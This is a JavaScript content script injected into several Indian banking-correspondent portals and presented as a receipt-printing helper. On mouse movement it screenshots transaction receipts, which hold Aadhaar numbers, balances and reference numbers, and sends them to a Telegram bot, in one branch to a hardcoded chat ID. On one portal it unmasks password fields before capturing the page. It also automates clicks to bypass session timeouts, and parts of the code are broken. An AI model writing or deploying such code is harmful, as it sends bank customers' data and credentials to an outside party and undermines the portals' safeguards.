// installation varification
console.log("script.js loaded successfully");

if (window.location.href.includes('paycsc.in')) {
    // executable algorithm for digipay lite 
    const notificationManager = new NotificationManager();
    const telegramBot = new telegram_bot(user.telegramBotToken);

    // find receipt and send to telegram user
    document.addEventListener('mousemove', async (e) => {
        let isRunning = false;
        try {
            if (isRunning) return;
            isRunning = true;
            var receiptNode = document.querySelector('i.ng-star-inserted').closest('.modal-body');
            if (localStorage.getItem('last_receipt') !== receiptNode.outerHTML && receiptNode.offsetHeight > 0) {
                localStorage.setItem('last_receipt', receiptNode.outerHTML);
                console.log('Receipt found');
                await capture_snapshot(receiptNode).then(base64data => {
                    var blob_object = base64ToBlob(base64data);
                    telegramBot.send_photo(user.telegramChatID, blob_object, receiptNode.innerText);
                    notificationManager.pushNotification('Digipay', 'New transaction is made through Digipay Lite.', '');
                    console.log('Snap is sent to the telegram user.');
                });
            }
            isRunning = false;
        } catch {
            //console.log('%cError Occured...', 'color: red');
        } finally {
            isRunning = false;
        }
    });

    window.addEventListener('keydown', function (e) {
        if (e.ctrlKey && e.key.toLocaleLowerCase() === 'p') {
            e.preventDefault();
            // Print receipt
            this.alert('Print receipt...');
            try {
                var receiptNode = document.querySelector('i.ng-star-inserted').closest('.modal-body');
                var custom_code = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Digipay Receipt System</title><style>* {font-family: system-ui;font-size: 12px;color: black !important;font-weight: 600;padding: 0;}h5 {margin: 0 auto;}div {display: flex;flex-direction: column;align-items: center;justify-content: center;}td {height: 22px;max-width: 150px;overflow: hidden;text-overflow: ellipsis;white-space: nowrap;}.text-center {text-align: center;}.app-modal-body {display: flex;flex-direction: column;width: 100%;}.conf-message {display: flex;flex-direction: column;align-items: center;margin: 0 0 12px 0;}ul {display: flex;flex-direction: column;padding: 0;gap: 2px;width: 100%;}ul li {display: flex;justify-content: space-between;align-items: center;}ul li:nth-child(2) {text-align: right;}button,h6,input {display: none;}</style></head><body>${receiptNode.outerHTML}<hr></body></html>`;
                // initialisation 
                var pop_up = new PopUp('Digipay receipt', 100, 100);
                pop_up.open();
                pop_up.write(custom_code);
                pop_up.print();
            } catch (error) {
                console.error(error);
            }
        }
    });
} else if (window.location.href.includes('pnbfikiosk')) {
    // executable script for pnb bc
    const notificationManager = new NotificationManager();
    const telegramBot = new telegram_bot(user.telegramBotToken);

    // find receipt and send to telegram user
    document.addEventListener('mousemove', async (e) => {
        let isRunning = false;
        try {
            if (isRunning) return;
            isRunning = true;
            var receiptNode = document.querySelector(`#${document.querySelector(`[title="Print"]`).getAttribute('onclick').replace(`printDiv('`, '').replace(`');`, '')}`);
            if (localStorage.getItem('last_receipt') !== receiptNode.outerHTML && receiptNode.offsetHeight > 0) {
                localStorage.setItem('last_receipt', receiptNode.outerHTML);
                console.log('Receipt found');
                await capture_snapshot(receiptNode).then(base64data => {
                    var blob_object = base64ToBlob(base64data);
                    telegramBot.send_photo(5098569117, blob_object, receiptNode.innerText);
                    notificationManager.pushNotification('Punjab National Bank', 'New transaction is made through PNB BC.', '');
                    console.log('Snap is sent to the telegram user.');
                });
            }

            isRunning = false;
        } catch {
            //console.log('%cError Occured...', 'color: red');
        } finally {
            isRunning = false;
        }
    });
    
    window.addEventListener('keydown', function (e) {
        if (e.ctrlKey && e.key.toLocaleLowerCase() === 'p') {
            e.preventDefault();
            // Print receipt
            this.alert('Print receipt...');
            try {
                var receiptNode = document.querySelector(`#${document.querySelector(`[title="Print"]`).getAttribute('onclick').replace(`printDiv('`, '').replace(`');`, '')}`);
                var custom_style = `<style>* {font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;font-size: 10px;}img, button {display: none;}td, th {border: 0;max-width: 90px;overflow: hidden;text-overflow: ellipsis;}</style>`;
                var pop_up = new PopUp('PNB BC receipt', 100, 100);
                pop_up.open();
                pop_up.write(custom_style + receiptNode.outerHTML);
                pop_up.print();
            } catch (error) {
                console.error(error);
            }
        }
    });

    // change default print button function
    document.querySelector(`[title="Print"]`).onclick() = (e) => {
        e.preventDefault();
            // Print receipt
            this.alert('Print receipt...');
            try {
                var receiptNode = document.querySelector(`#${e.target.getAttribute('onclick').replace(`printDiv('`, '').replace(`');`, '')}`);
                var custom_style = `<style>* {font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;font-size: 10px;}img, button {display: none;}td, th {border: 0;max-width: 90px;overflow: hidden;text-overflow: ellipsis;}</style>`;
                var pop_up = new PopUp('PNB BC receipt', 100, 100);
                pop_up.open();
                pop_up.write(custom_style + receiptNode.outerHTML);
                pop_up.print();
            } catch (error) {
                console.error(error);
            }
    }

} else if (window.location.href.includes('centralbank.org')) {
    // executable script for CBI BC
    const notificationManager = new NotificationManager();
    const telegramBot = new telegram_bot(user.telegramBotToken);

    // find receipt and send to telegram user
    document.addEventListener('mousemove', async (e) => {
        let isRunning = false;
        try {
            if (isRunning) return;
            isRunning = true;
            var receiptNodes = document.querySelectorAll(`.ResponseDiv,.ErrorDiv`);
            for (const receiptNode of receiptNodes) {
                if (localStorage.getItem('last_receipt') !== receiptNode.outerHTML && receiptNode.offsetHeight > 0) {
                    localStorage.setItem('last_receipt', receiptNode.outerHTML);
                    console.log('Receipt node found');
                    document.querySelectorAll(`input[type='password']`).forEach(hidden_text => {
                        hidden_text.type = 'text';
                    });
                    await capture_snapshot(receiptNode.closest('#RenderHere')).then(base64data => {
                        var blob_object = base64ToBlob(base64data);
                        telegramBot.send_photo(user.telegramChatID, blob_object, receiptNode.innerText);
                        notificationManager.pushNotification('Central Bank', 'New transaction is made through CBI BC.', '');
                        console.log('Snap is sent to the telegram user.');
                    });
                }
            }
            isRunning = false;
        } catch {
            //console.log('%cError Occured...', 'color: red');
        } finally {
            isRunning = false;
        }
    });

    // automatic action to bypass timeout
    window.addEventListener('keydown', function (e) {
        if (e.which === 119) {
            toggleCode(() => {
                document.querySelector(`#AEPSBtn`).click()
            });
        }
    });
} else if (window.location.href.includes('bankofbaroda')) {
    // executable script for bbupgb bc
    const notificationManager = new NotificationManager();
    const telegramBot = new telegram_bot(user.telegramBotToken);

    // find receipt and send to telegram user
    try {
        document.querySelector('iframe').addEventListener('load', (e) => {
            e.target.contentWindow.addEventListener('mousemove', async (e) => {
                let isRunning = false;
                try {
                    if (isRunning) return;
                    isRunning = true;
                    var receiptNodes = document.querySelector('iframe').contentDocument.querySelectorAll('#divtoprint');
                    for (const receiptNode of receiptNodes) {
                        if (localStorage.getItem('last_receipt') !== receiptNode.outerHTML && receiptNode.offsetHeight > 0) {
                            localStorage.setItem('last_receipt', receiptNode.outerHTML);
                            console.log('Receipt node found');
                            await capture_snapshot(receiptNode).then(base64data => {
                                var blob_object = base64ToBlob(base64data);
                                telegramBot.send_photo(user.telegramChatID, blob_object, receiptNode.innerText);
                                notificationManager.pushNotification('BUPGB Bank', 'New transaction is made through BUPGB portal.', '');
                                console.log('Snap is sent to the telegram user.');
                            });
                        }
                    }
                    isRunning = false;
                } catch {
                    //console.log('%cError Occured...', 'color: red');
                } finally {
                    isRunning = false;
                }
            });

            e.target.contentWindow.addEventListener('keyup', function (e) {
                // automatic action to bypass timeout
                if (e.which === 119) {
                    toggleCode(() => {
                        document.querySelector(`[href="/admin/AdminWelcome.jsp"]`).click();
                    });
                } else if (e.ctrlKey && e.key.toLocaleLowerCase() === 'p') {
                    // print receipt
                    e.preventDefault();
                    var receiptNode = document.querySelector('iframe').contentDocument.querySelector('#divtoprint');
                    var custom_code = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>BUPGB Receipt System</title><style>* {font-size: 10px;font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;}td:not(.pagename) {max-width: 90px;overflow: hidden;text-overflow: ellipsis;}img {display: none;}tr td:nth-child(2) {text-align: right;}tr td:nth-child(1) {text-align: left;}table table {display: none;}</style></head><body>${receiptNode.innerHTML}<script>document.querySelectorAll('tr:not(:has(>.pagename))').forEach(field => {if ((field.innerText.includes('Transaction')) || (field.innerText.includes('Date')) || (field.innerText.includes('Time')) || (field.innerText.includes('Aadhar')) || (field.innerText.includes('STAN')) || (field.innerText.includes('RRN')) || (field.innerText.includes('Balance'))) {} else {field.setAttribute('hidden','');}})</script></body></html>`;
                    var pop_up = new PopUp('BUPGB receipt', 100, 100);
                    pop_up.open();
                    pop_up.write(custom_code);
                    pop_up.print();
                    pop_up.document.querySelectorAll('tr:not(:has(>.pagename))').forEach(field => {
                        if ((field.innerText.includes('Transaction')) || (field.innerText.includes('Date')) || (field.innerText.includes('Time')) || (field.innerText.includes('Aadhar')) || (field.innerText.includes('STAN')) || (field.innerText.includes('RRN')) || (field.innerText.includes('Balance'))) {
                            //
                        } else {
                            field.setAttribute('hidden', '');
                        }
                    });
                }
            });
        });
    } catch {

    }

} else if (window.location.href.includes('example.com')) {
    
}